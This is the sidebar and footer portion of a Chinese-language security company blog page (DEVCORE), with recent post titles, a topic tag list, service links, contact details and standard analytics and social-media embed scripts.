                          <div class="widget-list-title">
                            Rails 動態樣板路徑的風險
                          </div>
                          <div class="widget-list-date">
                            2015-07-24
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2015/01/30/cookie-security-insight-acer/">
                          <div class="widget-list-title">
                            談 Cookie 認證安全－以宏碁雲端售票為例
                          </div>
                          <div class="widget-list-date">
                            2015-01-30
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2015/01/09/information-security-insight-kham/">
                          <div class="widget-list-title">
                            從寬宏售票談資安
                          </div>
                          <div class="widget-list-date">
                            2015-01-09
                          </div>
                        </a>
                      </li>
  

                    </ul>
                  </div>
                  <!--最新文章 end--><!--文章標籤-->
                  <div class="widget">
                    <div class="widget-title">
                      文章標籤
                    </div>
                    <ul class="widget-tags">
                      
                                        
                    
                      <li><a href="/blog/tag/公告/">公告 <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/JavaScript/">JavaScript <span class="count">(3)</span></a></li>
                    
                      <li><a href="/blog/tag/Hijack/">Hijack <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/HTTP Header/">HTTP Header <span class="count">(6)</span></a></li>
                    
                      <li><a href="/blog/tag/Defense/">Defense <span class="count">(9)</span></a></li>
                    
                      <li><a href="/blog/tag/OpenSource/">OpenSource <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Vulnerability/">Vulnerability <span class="count">(8)</span></a></li>
                    
                      <li><a href="/blog/tag/Mail/">Mail <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/Phishing/">Phishing <span class="count">(4)</span></a></li>
                    
                      <li><a href="/blog/tag/XSS/">XSS <span class="count">(3)</span></a></li>
                    
                      <li><a href="/blog/tag/OpenSSL/">OpenSSL <span class="count">(4)</span></a></li>
                    
                      <li><a href="/blog/tag/CVE/">CVE <span class="count">(10)</span></a></li>
                    
                      <li><a href="/blog/tag/WordPress/">WordPress <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Brute-force/">Brute-force <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/PHP/">PHP <span class="count">(3)</span></a></li>
                    
                      <li><a href="/blog/tag/LFI/">LFI <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/DNS/">DNS <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/Reconnaissance/">Reconnaissance <span class="count">(4)</span></a></li>
                    
                      <li><a href="/blog/tag/SVN/">SVN <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/IM/">IM <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Facebook/">Facebook <span class="count">(5)</span></a></li>
                    
                      <li><a href="/blog/tag/Session/">Session <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/Cookie/">Cookie <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/Statistics/">Statistics <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/WAF/">WAF <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Proxy/">Proxy <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Mobile/">Mobile <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/Android/">Android <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/iOS/">iOS <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/SSL/">SSL <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/MITM/">MITM <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/infoleak/">infoleak <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/IoT/">IoT <span class="count">(3)</span></a></li>
                    
                      <li><a href="/blog/tag/IP Camera/">IP Camera <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Shell/">Shell <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/WebView/">WebView <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/UXSS/">UXSS <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Cashflow/">Cashflow <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Vulreport/">Vulreport <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Rails/">Rails <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/RCE/">RCE <span class="count">(5)</span></a></li>
                    
                      <li><a href="/blog/tag/IDOR/">IDOR <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/徵才/">徵才 <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/BugBounty/">BugBounty <span class="count">(4)</span></a></li>
                    
                      <li><a href="/blog/tag/Backdoor/">Backdoor <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/Pentest/">Pentest <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/ecommerce/">ecommerce <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Advisory/">Advisory <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/DDoS/">DDoS <span class="count">(1)</span></a></li>
                    
                  
                

                    </ul>
                  </div>
                  <!--文章標籤 end-->
                </div>
              </div>
              <div id="fb-root"></div>
              <script>(function(d, s, id) {
                var js, fjs = d.getElementsByTagName(s)[0];
                if (d.getElementById(id)) return;
                js = d.createElement(s); js.id = id;
                js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
                fjs.parentNode.insertBefore(js, fjs);
              }(document, 'script', 'facebook-jssdk'));</script>
            </div>
          </div>


        </div>
        <div class="footer">
          <div class="footer-inner">
            <div class="footer-top">
              <div class="footer-services">
                <a class="footer-service col" href="/services/penetration-test" title="滲透測試服務 Penetration Test">
                  <div class="footer-service-icon service-icon service-icon-penetration-test"></div>
                  <div class="footer-service-title">
                    滲透測試服務
                  </div>
                </a><a class="footer-service col" href="/services/security-training" title="資安教育訓練 Security Training">
                  <div class="footer-service-icon service-icon service-icon-security-training"></div>
                  <div class="footer-service-title">
                    資安教育訓練
                  </div>
                </a><a class="footer-service col" href="/services/incident-response" title="資安事件處理 Incident Response">
                  <div class="footer-service-icon service-icon service-icon-incident-response"></div>
                  <div class="footer-service-title">
                    資安事件處理
                  </div>
                </a><a class="footer-service col" href="/services/security-consulting" title="資安顧問服務 Security Consulting">
                  <div class="footer-service-icon service-icon service-icon-security-consulting"></div>
                  <div class="footer-service-title">
                    資安顧問服務
                  </div>
                </a>
              </div>
            </div>
            <div class="footer-bottom">
              <div class="footer-links-group">
                <ul class="footer-links">
                  <li>
                    <a href="/services/penetration-test" title="滲透測試服務 Penetration Test">Services</a>
                  </li>
                  <li>
                    <a href="/blog/" title="部落格 Blog">Blog</a>
                  </li>
                  <li>
                    <a href="/about/" title="關於 About">About</a>
                  </li>
                  <li>
                    <a href="/contact/" title="聯絡 Contact">Contact</a>
                  </li>
                </ul>
                <ul class="footer-links">
                  <li>
                    <a href="/services/security-seal" title="網站安全標章 Security Seal">Security Seal</a>
                  </li>
                  <li>
                    <a href="/partners/" title="合作夥伴 Partners">Partners</a>
                  </li>
                </ul>
                <ul class="footer-links">
                  <li>
                    <a href="https://www.facebook.com/D3VC0RE" title="DEVCORE Facebook 粉絲團" target="_blank">Facebook</a>
                  </li>
                  <li>
                    <a href="https://plus.google.com/118439315679478709768/posts" title="DEVCORE Google+ 專頁" target="_blank">Google+</a>
                  </li>
                  <li>
                    <a href="https://twitter.com/d3vc0r3" title="DEVCORE Twitter" target="_blank">Twitter</a>
                  </li>
                </ul>
              </div>
              <ul class="footer-info">
                <li>
                  電話：02-2718-0156
                </li>
                <li>
                  Email：contact [at] devco.re
                </li>
                <li>
                  統編：53955237
                </li>
              </ul>
              <ul class="footer-info">
                <li>
                  地址：10487 台北市中山區復興北路 168 號 10 樓
                </li>
                <li>
                  ©2016 DEVCORE 戴夫寇爾
                </li>
              </ul>
            </div>
          </div>
        </div>
        <div class="off-canvas-mask"></div>
      </div>
    </div>
    <script src="/assets/themes/devcore/javascripts/vender/modernizr.js" type="text/javascript"></script>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js" type="text/javascript"></script>
    <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="/assets/themes/devcore/javascripts/off-canvas.min.js" type="text/javascript"></script>
    <script src="/assets/themes/devcore/javascripts/all.min.js" type="text/javascript"></script>
    <script src="/assets/themes/devcore/javascripts/gcse.js" type="text/javascript"></script>
    


  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-30830800-1']);
  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>




    <!-- Google Tag Manager -->
    <noscript>
      <iframe src="//www.googletagmanager.com/ns.html?id=GTM-K5B8NW" height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
    <script>
      (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-K5B8NW');
    </script>
    <!-- End Google Tag Manager -->
  </body>
</html>

